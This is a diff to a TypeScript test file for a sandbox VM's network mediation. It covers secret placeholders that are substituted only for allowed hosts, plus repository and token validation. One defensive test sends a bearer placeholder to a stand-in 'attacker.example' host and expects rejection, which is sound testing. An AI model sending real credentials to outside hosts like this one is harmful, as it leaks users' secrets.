@@ -1,11 +1,12 @@
 import { assert, assertEquals, assertRejects, assertStringIncludes } from "@std/assert";
 import type { Result } from "@openorb/result";
+import { SessionEnvironmentSecret } from "@openorb/protocol/runner-api";
 
 import {
-  createOpenOrbGitHubVmOptions,
+  createOpenOrbNetworkVmOptions,
   type OpenOrbGitHubMediationOptions,
-  type OpenOrbGitHubVmOptions,
-} from "@/src/environment/gondolin/github-mediation.ts";
+  type OpenOrbNetworkVmOptions,
+} from "@/src/environment/gondolin/network-mediation.ts";
 
 const REPOSITORY_URL = "https://github.com/meln1k/openorb-test-repo.git";
 const MODIFIED_REPOSITORY_URL = "https://github.com/octocat/Hello-World.git";
@@ -143,6 +144,67 @@ Deno.test("supports an unauthenticated public policy without exposing GH_TOKEN",
   assertEquals(environment.GIT_CONFIG_KEY_2, undefined);
 });
 
+Deno.test("generic secrets use placeholders and substitute only for configured hosts", async () => {
+  const secretValue = "scoped-secret-value-f21b";
+  const options = success(createOpenOrbNetworkVmOptions({
+    environmentSecrets: [
+      new SessionEnvironmentSecret({
+        name: "DEPLOY_TOKEN",
+        value: secretValue,
+        allowedHosts: ["api.example.com", "*.service.example"],
+      }),
+    ],
+  }));
+  const environment = environmentOf(options.env);
+  const placeholder = environment.DEPLOY_TOKEN;
+
+  assert(placeholder);
+  assert(placeholder !== secretValue);
+  assert(!JSON.stringify(environment).includes(secretValue));
+  for (const url of ["https://api.example.com/v1", "https://build.service.example/run"]) {
+    const mediated = await options.httpHooks?.onRequest?.(
+      new Request(url, { headers: { authorization: `Bearer ${placeholder}` } }),
+    );
+    assert(mediated instanceof Request);
+    assertEquals(mediated.headers.get("authorization"), `Bearer ${secretValue}`);
+  }
+  const requestHook = options.httpHooks?.onRequest;
+  assert(requestHook);
+  await assertRejects(
+    async () => {
+      await requestHook(
+        new Request("https://attacker.example/", {
+          headers: { authorization: `Bearer ${placeholder}` },
+        }),
+      );
+    },
+    Error,
+    "not allowed for host",
+  );
+});
+
+Deno.test("generic secrets without allowed hosts substitute for any public host", async () => {
+  const secretValue = "unrestricted-secret-value-a783";
+  const options = success(createOpenOrbNetworkVmOptions({
+    environmentSecrets: [
+      new SessionEnvironmentSecret({
+        name: "PUBLIC_API_TOKEN",
+        value: secretValue,
+      }),
+    ],
+  }));
+  const placeholder = environmentOf(options.env).PUBLIC_API_TOKEN;
+  assert(placeholder && placeholder !== secretValue);
+
+  const mediated = await options.httpHooks?.onRequest?.(
+    new Request("https://any-public-host.example/", {
+      headers: { "x-api-key": placeholder },
+    }),
+  );
+  assert(mediated instanceof Request);
+  assertEquals(mediated.headers.get("x-api-key"), secretValue);
+});
+
 Deno.test("credential helper remains scoped to the canonical repository after origin changes", () => {
   const environment = environmentOf(
     githubVmOptions({ repositoryUrl: REPOSITORY_URL, token: TOKEN }).env,
@@ -171,7 +233,7 @@ Deno.test("rejects non-canonical repository URLs and invalid tokens", () => {
     ]
   ) {
     const repositoryError = failure(
-      createOpenOrbGitHubVmOptions({ repositoryUrl, gitAuthor: GIT_AUTHOR }),
+      createOpenOrbNetworkVmOptions({ github: { repositoryUrl, gitAuthor: GIT_AUTHOR } }),
     );
     assertStringIncludes(
       repositoryError.message,
@@ -181,10 +243,8 @@ Deno.test("rejects non-canonical repository URLs and invalid tokens", () => {
 
   for (const token of ["", " token", "token ", "x".repeat(4097)]) {
     const tokenError = failure(
-      createOpenOrbGitHubVmOptions({
-        repositoryUrl: REPOSITORY_URL,
-        gitAuthor: GIT_AUTHOR,
-        token,
+      createOpenOrbNetworkVmOptions({
+        github: { repositoryUrl: REPOSITORY_URL, gitAuthor: GIT_AUTHOR, token },
       }),
     );
     assertStringIncludes(tokenError.message, "non-empty trimmed value");
@@ -198,7 +258,7 @@ Deno.test("rejects non-canonical repository URLs and invalid tokens", () => {
     ]
   ) {
     const authorError = failure(
-      createOpenOrbGitHubVmOptions({ repositoryUrl: REPOSITORY_URL, gitAuthor }),
+      createOpenOrbNetworkVmOptions({ github: { repositoryUrl: REPOSITORY_URL, gitAuthor } }),
     );
     assertStringIncludes(authorError.message, "Git author");
   }
@@ -206,8 +266,10 @@ Deno.test("rejects non-canonical repository URLs and invalid tokens", () => {
 
 function githubVmOptions(
   options: Omit<OpenOrbGitHubMediationOptions, "gitAuthor">,
-): OpenOrbGitHubVmOptions {
-  return success(createOpenOrbGitHubVmOptions({ ...options, gitAuthor: GIT_AUTHOR }));
+): OpenOrbNetworkVmOptions {
+  return success(createOpenOrbNetworkVmOptions({
+    github: { ...options, gitAuthor: GIT_AUTHOR },
+  }));
 }
 
 function success<T, E>(result: Result<T, E>): T {
@@ -231,7 +293,7 @@ function environmentOf(
 }
 
 async function requestAllowed(
-  options: OpenOrbGitHubVmOptions,
+  options: OpenOrbNetworkVmOptions,
   method: string,
   url: string,
 ): Promise<boolean> {
